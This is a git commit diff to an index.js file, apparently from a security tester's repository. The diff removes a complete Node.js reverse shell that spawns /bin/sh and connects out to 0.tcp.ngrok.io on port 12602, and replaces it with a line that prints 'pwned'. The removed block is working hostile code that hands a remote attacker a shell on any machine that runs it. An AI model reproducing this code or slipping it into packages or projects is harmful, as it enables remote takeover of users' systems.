1224e71e17c2e09a6c36d1a97174efd1ece57c49
Jonatas Fil <19884336+ninj4c0d3r@users.noreply.github.com>
2020-11-25 11:25:50 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,13 +1,1 @@
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(12602, "0.tcp.ngrok.io", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
-})();
-
+console.log('pwned');
